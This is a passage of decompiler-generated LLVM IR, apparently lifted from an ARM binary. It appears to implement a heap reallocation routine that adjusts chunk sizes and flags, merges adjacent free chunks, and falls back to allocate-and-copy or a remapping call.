bb:                                               ; preds = %dec_label_pc_1282c
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_1282c, %bb
  %v2_1283c = xor i1 %v7_12834, true
  %v3_1283c = and i1 %v2_12834, %v2_1283c
  br i1 %v3_1283c, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_1283c = and i32 %v1_1282c, -8
  store i32 %v5_1283c, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_12840 = and i32 %v3_12830, 2
  %v2_12840 = icmp eq i32 %v1_12840, 0
  %v1_12844 = add i32 %v0_12830, -8
  store i32 %v1_12844, i32* @sl, align 4
  %v1_12848 = and i32 %v3_12830, -4
  store i32 %v1_12848, i32* @r6, align 4
  br i1 %v2_12840, label %dec_label_pc_12850, label %dec_label_pc_12a28

dec_label_pc_12850:                               ; preds = %bb29
  %v1_12850 = load i32, i32* @sb, align 4
  %v3_12850 = icmp ult i32 %v1_12848, %v1_12850
  br i1 %v3_12850, label %dec_label_pc_1285c, label %bb30

bb30:                                             ; preds = %dec_label_pc_12850
  store i32 %v1_12848, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129c0

dec_label_pc_1285c:                               ; preds = %dec_label_pc_12850
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12864 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_12864, i32* %r0.global-to-local, align 4
  %v1_12868 = add i32 %v4_12864, 44
  %v2_12868 = inttoptr i32 %v1_12868 to i32*
  %v3_12868 = load i32, i32* %v2_12868, align 4
  store i32 %v3_12868, i32* %r3.global-to-local, align 4
  %v2_1286c = add i32 %v1_12848, %v1_12844
  store i32 %v2_1286c, i32* @r4, align 4
  %v9_12870 = icmp eq i32 %v2_1286c, %v3_12868
  %v1_12874 = add i32 %v2_1286c, 4
  %v2_12874 = inttoptr i32 %v1_12874 to i32*
  %v3_12874 = load i32, i32* %v2_12874, align 4
  store i32 %v3_12874, i32* %r1.global-to-local, align 4
  br i1 %v9_12870, label %dec_label_pc_1287c, label %dec_label_pc_128b8

dec_label_pc_1287c:                               ; preds = %dec_label_pc_1285c
  %v1_1287c = and i32 %v3_12874, -4
  %v2_12880 = add i32 %v1_1287c, %v1_12848
  store i32 %v2_12880, i32* %r1.global-to-local, align 4
  %v1_12884 = add i32 %v1_12850, 16
  store i32 %v1_12884, i32* %r3.global-to-local, align 4
  %v3_12888 = icmp ult i32 %v2_12880, %v1_12884
  br i1 %v3_12888, label %dec_label_pc_1290c, label %dec_label_pc_12890

dec_label_pc_12890:                               ; preds = %dec_label_pc_1287c
  %v2_12890 = sub i32 %v2_12880, %v1_12850
  %v1_12894 = urem i32 %v3_12830, 2
  %v2_12898 = add i32 %v1_12850, %v1_12844
  store i32 %v2_12898, i32* %r1.global-to-local, align 4
  %v2_1289c = or i32 %v1_12850, %v1_12894
  store i32 %v2_1289c, i32* %r2.global-to-local, align 4
  %v1_128a0 = or i32 %v2_12890, 1
  store i32 %v1_128a0, i32* %r3.global-to-local, align 4
  store i32 %v0_12830, i32* @r4, align 4
  store i32 %v2_1289c, i32* %v2_12830, align 4
  %v0_128ac = load i32, i32* %r1.global-to-local, align 4
  %v1_128ac = load i32, i32* %r0.global-to-local, align 4
  %v2_128ac = add i32 %v1_128ac, 44
  %v3_128ac = inttoptr i32 %v2_128ac to i32*
  store i32 %v0_128ac, i32* %v3_128ac, align 4
  %v0_128b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_128b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_128b0 = add i32 %v1_128b0, 4
  %v3_128b0 = inttoptr i32 %v2_128b0 to i32*
  store i32 %v0_128b0, i32* %v3_128b0, align 4
  br label %dec_label_pc_12af4

dec_label_pc_128b8:                               ; preds = %dec_label_pc_1285c
  %v1_128b8 = and i32 %v3_12874, -2
  %v2_128bc = add i32 %v1_128b8, %v2_1286c
  store i32 %v2_128bc, i32* %r3.global-to-local, align 4
  %v1_128c0 = add i32 %v2_128bc, 4
  %v2_128c0 = inttoptr i32 %v1_128c0 to i32*
  %v3_128c0 = load i32, i32* %v2_128c0, align 4
  store i32 %v3_128c0, i32* %r3.global-to-local, align 4
  %v1_128c4 = urem i32 %v3_128c0, 2
  %v2_128c4 = icmp eq i32 %v1_128c4, 0
  br i1 %v2_128c4, label %dec_label_pc_128cc, label %dec_label_pc_1290c

dec_label_pc_128cc:                               ; preds = %dec_label_pc_128b8
  %v1_128cc = and i32 %v3_12874, -4
  store i32 %v1_128cc, i32* %r3.global-to-local, align 4
  %v2_128d0 = add i32 %v1_128cc, %v1_12848
  store i32 %v2_128d0, i32* %r0.global-to-local, align 4
  %v3_128d4 = icmp ult i32 %v2_128d0, %v1_12850
  br i1 %v3_128d4, label %dec_label_pc_1290c, label %dec_label_pc_128dc

dec_label_pc_128dc:                               ; preds = %dec_label_pc_128cc
  %v1_128dc = add i32 %v1_12848, %v0_12830
  %v2_128dc = inttoptr i32 %v1_128dc to i32*
  %v3_128dc = load i32, i32* %v2_128dc, align 4
  store i32 %v3_128dc, i32* %r1.global-to-local, align 4
  %v1_128e0 = add i32 %v3_128dc, 12
  %v2_128e0 = inttoptr i32 %v1_128e0 to i32*
  %v3_128e0 = load i32, i32* %v2_128e0, align 4
  store i32 %v3_128e0, i32* %r3.global-to-local, align 4
  %v9_128e4 = icmp eq i32 %v3_128e0, %v2_1286c
  %v1_128e8 = add i32 %v2_1286c, 12
  %v2_128e8 = inttoptr i32 %v1_128e8 to i32*
  %v3_128e8 = load i32, i32* %v2_128e8, align 4
  store i32 %v3_128e8, i32* %r2.global-to-local, align 4
  br i1 %v9_128e4, label %dec_label_pc_128f0, label %dec_label_pc_128fc

dec_label_pc_128f0:                               ; preds = %dec_label_pc_128dc
  %v1_128f0 = add i32 %v3_128e8, 8
  %v2_128f0 = inttoptr i32 %v1_128f0 to i32*
  %v3_128f0 = load i32, i32* %v2_128f0, align 4
  store i32 %v3_128f0, i32* %r3.global-to-local, align 4
  %v9_128f4 = icmp eq i32 %v3_128f0, %v2_1286c
  br i1 %v9_128f4, label %dec_label_pc_12900, label %dec_label_pc_128fc

dec_label_pc_128fc:                               ; preds = %dec_label_pc_128dc, %dec_label_pc_128f0
  %v0_128fc = call i32 @function_1301c()
  store i32 %v0_128fc, i32* %r0.global-to-local, align 4
  %v0_12900.pre = load i32, i32* @r1, align 4
  %v1_12900.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12900

dec_label_pc_12900:                               ; preds = %dec_label_pc_128f0, %dec_label_pc_128fc
  %v1_12900 = phi i32 [ %v3_128e8, %dec_label_pc_128f0 ], [ %v1_12900.pre, %dec_label_pc_128fc ]
  %v0_12900 = phi i32 [ %v3_128dc, %dec_label_pc_128f0 ], [ %v0_12900.pre, %dec_label_pc_128fc ]
  %v2_12900 = add i32 %v1_12900, 8
  %v3_12900 = inttoptr i32 %v2_12900 to i32*
  store i32 %v0_12900, i32* %v3_12900, align 4
  %v0_12904 = load i32, i32* %r2.global-to-local, align 4
  %v1_12904 = load i32, i32* %r1.global-to-local, align 4
  %v2_12904 = add i32 %v1_12904, 12
  %v3_12904 = inttoptr i32 %v2_12904 to i32*
  store i32 %v0_12904, i32* %v3_12904, align 4
  %v1_129c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129c0

dec_label_pc_1290c:                               ; preds = %dec_label_pc_1287c, %dec_label_pc_128cc, %dec_label_pc_128b8
  %v1_1290c = add i32 %v1_12850, -7
  store i32 %v1_1290c, i32* @r0, align 4
  %v0_12910 = call i32 @function_11d34()
  store i32 %v0_12910, i32* @r0, align 4
  store i32 %v0_12910, i32* %r1.global-to-local, align 4
  %v2_12914 = icmp eq i32 %v0_12910, 0
  br i1 %v2_12914, label %bb31, label %dec_label_pc_12920

bb31:                                             ; preds = %dec_label_pc_1290c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12af4

dec_label_pc_12920:                               ; preds = %dec_label_pc_1290c
  %v1_12928.pre = load i32, i32* @r4, align 4
  %v1_12920 = add i32 %v0_12910, -4
  %v2_12920 = inttoptr i32 %v1_12920 to i32*
  %v3_12920 = load i32, i32* %v2_12920, align 4
  store i32 %v3_12920, i32* @r3, align 4
  %v1_12924 = add i32 %v0_12910, -8
  store i32 %v1_12924, i32* @r7, align 4
  %v9_12928 = icmp eq i32 %v1_12924, %v1_12928.pre
  br i1 %v9_12928, label %.thread2, label %dec_label_pc_12938

.thread2:                                         ; preds = %dec_label_pc_12920
  %v2_1292c = and i32 %v3_12920, -4
  store i32 %v2_1292c, i32* %r3.global-to-local, align 4
  %v2_12930 = load i32, i32* @r6, align 4
  %v3_12930 = add i32 %v2_12930, %v2_1292c
  store i32 %v3_12930, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_129c0

dec_label_pc_12938:                               ; preds = %dec_label_pc_12920
  %v0_12938 = load i32, i32* @r6, align 4
  %v1_12938 = add i32 %v0_12938, -4
  store i32 %v1_12938, i32* @r2, align 4
  %v3_1293c = udiv i32 %v1_12938, 4
  store i32 %v3_1293c, i32* @ip, align 4
  %tmp37 = and i32 %v1_12938, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_12944 = icmp ult i32 %v1_12938, 36
  %v3_12944 = or i1 %tmp38, %v2_12944
  %v0_12954 = load i32, i32* @r5, align 4
  br i1 %v3_12944, label %dec_label_pc_12954, label %dec_label_pc_12948

dec_label_pc_12948:                               ; preds = %dec_label_pc_12938
  store i32 %v0_12954, i32* @r1, align 4
  %v0_1294c = call i32 @function_11840()
  store i32 %v0_1294c, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_12954:                               ; preds = %dec_label_pc_12938
  %v1_12954 = inttoptr i32 %v0_12954 to i32*
  %v2_12954 = load i32, i32* %v1_12954, align 4
  store i32 %v2_12954, i32* %r3.global-to-local, align 4
  %v2_12958 = inttoptr i32 %v0_12910 to i32*
  store i32 %v2_12954, i32* %v2_12958, align 4
  %v0_1295c = load i32, i32* @r5, align 4
  %v1_1295c = add i32 %v0_1295c, 4
  %v2_1295c = inttoptr i32 %v1_1295c to i32*
  %v3_1295c = load i32, i32* %v2_1295c, align 4
  store i32 %v3_1295c, i32* %r3.global-to-local, align 4
  %v1_12960 = load i32, i32* %r1.global-to-local, align 4
  %v2_12960 = add i32 %v1_12960, 4
  %v3_12960 = inttoptr i32 %v2_12960 to i32*
  store i32 %v3_1295c, i32* %v3_12960, align 4
  %v0_12964 = load i32, i32* @r5, align 4
  %v1_12964 = add i32 %v0_12964, 8
  %v2_12964 = inttoptr i32 %v1_12964 to i32*
  %v3_12964 = load i32, i32* %v2_12964, align 4
  store i32 %v3_12964, i32* %r3.global-to-local, align 4
  %v0_12968 = load i32, i32* @ip, align 4
  %v1_1296c = load i32, i32* %r1.global-to-local, align 4
  %v2_1296c = add i32 %v1_1296c, 8
  %v3_1296c = inttoptr i32 %v2_1296c to i32*
  store i32 %v3_12964, i32* %v3_1296c, align 4
  %tmp39 = icmp ult i32 %v0_12968, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_12974

dec_label_pc_12974:                               ; preds = %dec_label_pc_12954
  %v0_12974 = load i32, i32* @r5, align 4
  %v1_12974 = add i32 %v0_12974, 12
  %v2_12974 = inttoptr i32 %v1_12974 to i32*
  %v3_12974 = load i32, i32* %v2_12974, align 4
  store i32 %v3_12974, i32* %r3.global-to-local, align 4
  %v1_12978 = load i32, i32* %r1.global-to-local, align 4
  %v2_12978 = add i32 %v1_12978, 12
  %v3_12978 = inttoptr i32 %v2_12978 to i32*
  store i32 %v3_12974, i32* %v3_12978, align 4
  %v0_1297c = load i32, i32* @r5, align 4
  %v1_1297c = add i32 %v0_1297c, 16
  %v2_1297c = inttoptr i32 %v1_1297c to i32*
  %v3_1297c = load i32, i32* %v2_1297c, align 4
  store i32 %v3_1297c, i32* %r3.global-to-local, align 4
  %v0_12980 = load i32, i32* @ip, align 4
  %v1_12984 = load i32, i32* %r1.global-to-local, align 4
  %v2_12984 = add i32 %v1_12984, 16
  %v3_12984 = inttoptr i32 %v2_12984 to i32*
  store i32 %v3_1297c, i32* %v3_12984, align 4
  %tmp40 = icmp ult i32 %v0_12980, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_1298c

dec_label_pc_1298c:                               ; preds = %dec_label_pc_12974
  %v0_1298c = load i32, i32* @r5, align 4
  %v1_1298c = add i32 %v0_1298c, 20
  %v2_1298c = inttoptr i32 %v1_1298c to i32*
  %v3_1298c = load i32, i32* %v2_1298c, align 4
  store i32 %v3_1298c, i32* %r3.global-to-local, align 4
  %v1_12990 = load i32, i32* %r1.global-to-local, align 4
  %v2_12990 = add i32 %v1_12990, 20
  %v3_12990 = inttoptr i32 %v2_12990 to i32*
  store i32 %v3_1298c, i32* %v3_12990, align 4
  %v0_12994 = load i32, i32* @r5, align 4
  %v1_12994 = add i32 %v0_12994, 24
  %v2_12994 = inttoptr i32 %v1_12994 to i32*
  %v3_12994 = load i32, i32* %v2_12994, align 4
  store i32 %v3_12994, i32* %r3.global-to-local, align 4
  %v1_12998 = load i32, i32* %r1.global-to-local, align 4
  %v2_12998 = add i32 %v1_12998, 24
  %v3_12998 = inttoptr i32 %v2_12998 to i32*
  store i32 %v3_12994, i32* %v3_12998, align 4
  %v0_1299c = load i32, i32* @ip, align 4
  %v7_1299c = icmp eq i32 %v0_1299c, 9
  br i1 %v7_1299c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1298c
  %v1_129a0 = load i32, i32* @r5, align 4
  %v2_129a0 = add i32 %v1_129a0, 28
  %v3_129a0 = inttoptr i32 %v2_129a0 to i32*
  %v4_129a0 = load i32, i32* %v3_129a0, align 4
  store i32 %v4_129a0, i32* %r3.global-to-local, align 4
  %v2_129a4 = load i32, i32* %r1.global-to-local, align 4
  %v3_129a4 = add i32 %v2_129a4, 28
  %v4_129a4 = inttoptr i32 %v3_129a4 to i32*
  store i32 %v4_129a0, i32* %v4_129a4, align 4
  %v1_129a8 = load i32, i32* @r5, align 4
  %v2_129a8 = add i32 %v1_129a8, 32
  %v3_129a8 = inttoptr i32 %v2_129a8 to i32*
  %v4_129a8 = load i32, i32* %v3_129a8, align 4
  store i32 %v4_129a8, i32* %r3.global-to-local, align 4
  %v2_129ac = load i32, i32* %r1.global-to-local, align 4
  %v3_129ac = add i32 %v2_129ac, 32
  %v4_129ac = inttoptr i32 %v3_129ac to i32*
  store i32 %v4_129a8, i32* %v4_129ac, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1298c, %dec_label_pc_12974, %dec_label_pc_12954, %dec_label_pc_12948, %bb32
  %v0_129b0 = load i32, i32* @r5, align 4
  store i32 %v0_129b0, i32* @r0, align 4
  %v0_129b4 = call i32 @function_12da0()
  store i32 %v0_129b4, i32* %r0.global-to-local, align 4
  %v0_129b8 = load i32, i32* @r7, align 4
  %v1_129b8 = add i32 %v0_129b8, 8
  store i32 %v1_129b8, i32* @r4, align 4
  br label %dec_label_pc_12af4

dec_label_pc_129c0:                               ; preds = %bb30, %.thread2, %dec_label_pc_12900
  %v0_129d4 = phi i32 [ %v3_12930, %.thread2 ], [ %v1_12848, %bb30 ], [ %v1_129c0.pre, %dec_label_pc_12900 ]
  %v0_129c0 = load i32, i32* @sb, align 4
  %v2_129c0 = sub i32 %v0_129d4, %v0_129c0
  store i32 %v2_129c0, i32* %r1.global-to-local, align 4
  %v0_129c8 = load i32, i32* @sl, align 4
  %v1_129c8 = add i32 %v0_129c8, 4
  %v2_129c8 = inttoptr i32 %v1_129c8 to i32*
  %v3_129c8 = load i32, i32* %v2_129c8, align 4
  %tmp41 = icmp ugt i32 %v2_129c0, 15
  %v1_129f0 = urem i32 %v3_129c8, 2
  store i32 %v1_129f0, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_129f0, label %dec_label_pc_129d0

dec_label_pc_129d0:                               ; preds = %dec_label_pc_129c0
  %v2_129d4 = or i32 %v1_129f0, %v0_129d4
  store i32 %v2_129d4, i32* %r3.global-to-local, align 4
  store i32 %v2_129d4, i32* %v2_129c8, align 4
  %v0_129dc = load i32, i32* @sl, align 4
  %v1_129dc = load i32, i32* %r0.global-to-local, align 4
  %v2_129dc = add i32 %v1_129dc, %v0_129dc
  store i32 %v2_129dc, i32* %r2.global-to-local, align 4
  %v1_129e0 = add i32 %v2_129dc, 4
  %v2_129e0 = inttoptr i32 %v1_129e0 to i32*
  %v3_129e0 = load i32, i32* %v2_129e0, align 4
  %v1_129e4 = or i32 %v3_129e0, 1
  store i32 %v1_129e4, i32* %r3.global-to-local, align 4
  store i32 %v1_129e4, i32* %v2_129e0, align 4
  br label %dec_label_pc_12a20

dec_label_pc_129f0:                               ; preds = %dec_label_pc_129c0
  %v2_129f4 = add i32 %v0_129c8, %v0_129c0
  store i32 %v2_129f4, i32* %r0.global-to-local, align 4
  %v2_129f8 = or i32 %v1_129f0, %v0_129c0
  store i32 %v2_129f8, i32* %r3.global-to-local, align 4
  %v1_129fc = or i32 %v2_129c0, 1
  store i32 %v1_129fc, i32* %r2.global-to-local, align 4
  store i32 %v2_129f8, i32* %v2_129c8, align 4
  %v0_12a04 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a04 = load i32, i32* %r0.global-to-local, align 4
  %v2_12a04 = add i32 %v1_12a04, 4
  %v3_12a04 = inttoptr i32 %v2_12a04 to i32*
  store i32 %v0_12a04, i32* %v3_12a04, align 4
  %v0_12a08 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a08 = load i32, i32* %r1.global-to-local, align 4
  %v2_12a08 = add i32 %v1_12a08, %v0_12a08
  store i32 %v2_12a08, i32* %r2.global-to-local, align 4
  %v1_12a0c = add i32 %v2_12a08, 4
  %v2_12a0c = inttoptr i32 %v1_12a0c to i32*
  %v3_12a0c = load i32, i32* %v2_12a0c, align 4
  %v1_12a10 = or i32 %v3_12a0c, 1
  store i32 %v1_12a10, i32* %r3.global-to-local, align 4
  store i32 %v1_12a10, i32* %v2_12a0c, align 4
  %v0_12a18 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a18 = add i32 %v0_12a18, 8
  store i32 %v1_12a18, i32* @r0, align 4
  %v0_12a1c = call i32 @function_12da0()
  store i32 %v0_12a1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a20

dec_label_pc_12a20:                               ; preds = %dec_label_pc_129d0, %dec_label_pc_129f0
  %v0_12a20 = load i32, i32* @sl, align 4
  %v1_12a20 = add i32 %v0_12a20, 8
  store i32 %v1_12a20, i32* @r4, align 4
  br label %dec_label_pc_12af4

dec_label_pc_12a28:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r1.global-to-local, align 4
  %v4_12a30 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_12a30, i32* @r8, align 4
  %v2_12a34 = inttoptr i32 %v1_12844 to i32*
  %v3_12a34 = load i32, i32* %v2_12a34, align 4
  store i32 %v3_12a34, i32* @r4, align 4
  %v1_12a38 = add i32 %v4_12a30, 860
  %v2_12a38 = inttoptr i32 %v1_12a38 to i32*
  %v3_12a38 = load i32, i32* %v2_12a38, align 4
  %v1_12a3c = add i32 %v3_12a34, 4
  %v1_12a40 = add i32 %v3_12a38, -1
  store i32 %v1_12a40, i32* %r2.global-to-local, align 4
  %v2_12a44 = add i32 %v1_12a3c, %v1_12a40
  %v1_12a48 = load i32, i32* @sb, align 4
  %v2_12a48 = add i32 %v2_12a44, %v1_12a48
  store i32 %v2_12a48, i32* %r3.global-to-local, align 4
  %v2_12a4c = sub i32 0, %v3_12a38
  %v3_12a4c = and i32 %v2_12a48, %v2_12a4c
  store i32 %v3_12a4c, i32* @r7, align 4
  %v2_12a50 = sub i32 %v3_12a4c, %v3_12a34
  store i32 %v2_12a50, i32* @fp, align 4
  %v9_12a54 = icmp eq i32 %v1_12848, %v2_12a50
  br i1 %v9_12a54, label %dec_label_pc_12ac8, label %dec_label_pc_12a5c

dec_label_pc_12a5c:                               ; preds = %dec_label_pc_12a28
  %v2_12a5c = sub i32 %v1_12844, %v3_12a34
  store i32 %v2_12a5c, i32* %r0.global-to-local, align 4
  %v2_12a60 = add i32 %v3_12a34, %v1_12848
  store i32 %v2_12a60, i32* %r1.global-to-local, align 4
  store i32 %v3_12a4c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_12a6c = call i32 @function_145ec(i32 %v2_12a5c, i32 %v2_12a60, i32 %v3_12a4c, i32 1)
  store i32 %v4_12a6c, i32* %r0.global-to-local, align 4
  %v7_12a70 = icmp eq i32 %v4_12a6c, -1
  br i1 %v7_12a70, label %dec_label_pc_12abc, label %dec_label_pc_12a78

dec_label_pc_12a78:                               ; preds = %dec_label_pc_12a5c
  %v1_12a78 = load i32, i32* @r4, align 4
  %v2_12a78 = add i32 %v1_12a78, %v4_12a6c
  store i32 %v2_12a78, i32* %r0.global-to-local, align 4
  %v0_12a7c = load i32, i32* @fp, align 4
  %v1_12a7c = or i32 %v0_12a7c, 2
  store i32 %v1_12a7c, i32* %r3.global-to-local, align 4
  %v2_12a80 = add i32 %v2_12a78, 4
  %v3_12a80 = inttoptr i32 %v2_12a80 to i32*
  store i32 %v1_12a7c, i32* %v3_12a80, align 4
  %v0_12a84 = load i32, i32* @r8, align 4
  %v1_12a84 = add i32 %v0_12a84, 868
  %v2_12a84 = inttoptr i32 %v1_12a84 to i32*
  %v3_12a84 = load i32, i32* %v2_12a84, align 4
  store i32 %v3_12a84, i32* %r3.global-to-local, align 4
  %v1_12a88 = add i32 %v0_12a84, 880
  %v2_12a88 = inttoptr i32 %v1_12a88 to i32*
  %v3_12a88 = load i32, i32* %v2_12a88, align 4
  store i32 %v3_12a88, i32* %r2.global-to-local, align 4
  %v0_12a8c = load i32, i32* @r6, align 4
  %v2_12a8c = sub i32 %v3_12a84, %v0_12a8c
  store i32 %v2_12a8c, i32* %r3.global-to-local, align 4
  %v1_12a90 = load i32, i32* @r7, align 4
  %v2_12a90 = add i32 %v1_12a90, %v2_12a8c
  store i32 %v2_12a90, i32* %r1.global-to-local, align 4
  %v1_12a94 = add i32 %v0_12a84, 872
  %v2_12a94 = inttoptr i32 %v1_12a94 to i32*
  %v3_12a94 = load i32, i32* %v2_12a94, align 4
  store i32 %v3_12a94, i32* %r3.global-to-local, align 4
  %v1_12a9c = add i32 %v0_12a84, 884
  %v2_12a9c = inttoptr i32 %v1_12a9c to i32*
  %v3_12a9c = load i32, i32* %v2_12a9c, align 4
  store i32 %v3_12a9c, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_12a90, %v3_12a88
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_12a78
  store i32 %v2_12a90, i32* %v2_12a88, align 4
  %v0_12aa4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12aa4.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_12a78, %bb33
  %v1_12aa4 = phi i32 [ %v0_12a84, %dec_label_pc_12a78 ], [ %v1_12aa4.pre, %bb33 ]
  %v0_12aa4 = phi i32 [ %v2_12a90, %dec_label_pc_12a78 ], [ %v0_12aa4.pre, %bb33 ]
  %v2_12aa4 = add i32 %v1_12aa4, 868
  %v3_12aa4 = inttoptr i32 %v2_12aa4 to i32*
  store i32 %v0_12aa4, i32* %v3_12aa4, align 4
  %v0_12aa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12aa8 = load i32, i32* %r3.global-to-local, align 4
  %v2_12aa8 = add i32 %v1_12aa8, %v0_12aa8
  store i32 %v2_12aa8, i32* %r1.global-to-local, align 4
  %v1_12aac = load i32, i32* %r2.global-to-local, align 4
  %v0_12ab0 = load i32, i32* %r0.global-to-local, align 4
  %v1_12ab0 = add i32 %v0_12ab0, 8
  store i32 %v1_12ab0, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_12aa8, %v1_12aac
  br i1 %tmp43, label %bb35, label %dec_label_pc_12af4

bb35:                                             ; preds = %bb34
  %v5_12ab4 = load i32, i32* @r8, align 4
  %v6_12ab4 = add i32 %v5_12ab4, 884
  %v7_12ab4 = inttoptr i32 %v6_12ab4 to i32*
  store i32 %v2_12aa8, i32* %v7_12ab4, align 4
  br label %dec_label_pc_12af4

dec_label_pc_12abc:                               ; preds = %dec_label_pc_12a5c
  %v0_12abc = load i32, i32* @sb, align 4
  %v1_12abc = add i32 %v0_12abc, 4
  store i32 %v1_12abc, i32* %r3.global-to-local, align 4
  %v0_12ac0 = load i32, i32* @r6, align 4
  %v3_12ac0 = icmp ult i32 %v0_12ac0, %v1_12abc
  br i1 %v3_12ac0, label %dec_label_pc_12ad0, label %dec_label_pc_12abc.dec_label_pc_12ac8_crit_edge

dec_label_pc_12abc.dec_label_pc_12ac8_crit_edge:  ; preds = %dec_label_pc_12abc
  %v0_12ac8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12ac8

dec_label_pc_12ac8:                               ; preds = %dec_label_pc_12abc.dec_label_pc_12ac8_crit_edge, %dec_label_pc_12a28
  %v0_12ac8 = phi i32 [ %v0_12ac8.pre, %dec_label_pc_12abc.dec_label_pc_12ac8_crit_edge ], [ %v0_12830, %dec_label_pc_12a28 ]
  store i32 %v0_12ac8, i32* @r4, align 4
  br label %dec_label_pc_12af4

dec_label_pc_12ad0:                               ; preds = %dec_label_pc_12abc
  %v1_12ad0 = add i32 %v0_12abc, -7
  store i32 %v1_12ad0, i32* @r0, align 4
  %v0_12ad4 = call i32 @function_11d34()
  store i32 %v0_12ad4, i32* @r0, align 4
  store i32 %v0_12ad4, i32* @r4, align 4
  %v2_12ad8 = icmp eq i32 %v0_12ad4, 0
  br i1 %v2_12ad8, label %dec_label_pc_12af4, label %dec_label_pc_12ae0

dec_label_pc_12ae0:                               ; preds = %dec_label_pc_12ad0
  %v0_12ae0 = load i32, i32* @r6, align 4
  %v1_12ae0 = add i32 %v0_12ae0, -8
  store i32 %v1_12ae0, i32* @r2, align 4
  %v0_12ae4 = load i32, i32* @r5, align 4
  store i32 %v0_12ae4, i32* @r1, align 4
  %v0_12ae8 = call i32 @function_11840()
  %v0_12aec = load i32, i32* @r5, align 4
  store i32 %v0_12aec, i32* @r0, align 4
  %v0_12af0 = call i32 @function_12da0()
  store i32 %v0_12af0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12af4

dec_label_pc_12af4:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_12ad0, %dec_label_pc_12ac8, %dec_label_pc_12a20, %.thread6, %dec_label_pc_12890, %dec_label_pc_12ae0
  store i32 %v2_127e4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r2.global-to-local, align 4
  %v4_12b04 = load i32, i32* inttoptr (i32 127016 to i32*), align 8
  store i32 %v4_12b04, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_12b04)
  br label %dec_label_pc_12b10

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12818, %dec_label_pc_127c0, %dec_label_pc_127a8, %dec_label_pc_12af4
  %v0_12b10 = load i32, i32* @r4, align 4
  store i32 %v0_12b10, i32* %r0.global-to-local, align 4
  store i32 %v3_12788, i32* @r4, align 4
  store i32 %v6_12788, i32* @r5, align 4
  store i32 %v9_12788, i32* @r6, align 4
  store i32 %v12_12788, i32* @r7, align 4
  store i32 %v15_12788, i32* @r8, align 4
  store i32 %v18_12788, i32* @sb, align 4
  store i32 %v21_12788, i32* @sl, align 4
  store i32 %v24_12788, i32* @fp, align 4
  store i32 %v27_12788, i32* @lr, align 4
  ret i32 %v0_12b10

; uselistorder directives
  uselistorder i32 %v2_12aa8, { 1, 0, 2 }
  uselistorder i32 %v2_12a90, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12a6c, { 1, 0, 2 }
  uselistorder i32 %v3_12a4c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_129f0, { 2, 1, 0 }
  uselistorder i32 %v2_129c0, { 1, 0, 2 }
  uselistorder i32 %v0_12954, { 1, 0 }
  uselistorder i32 %v0_12910, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_12874, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1286c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12850, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_12848, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_12844, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_12834, { 1, 0 }
  uselistorder i32 %v0_12830, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12810, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 27, 5, 10, 6, 7, 8, 9, 20, 11, 13, 12, 19, 21, 14, 15, 16, 17, 18, 24, 23, 22, 25, 26 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
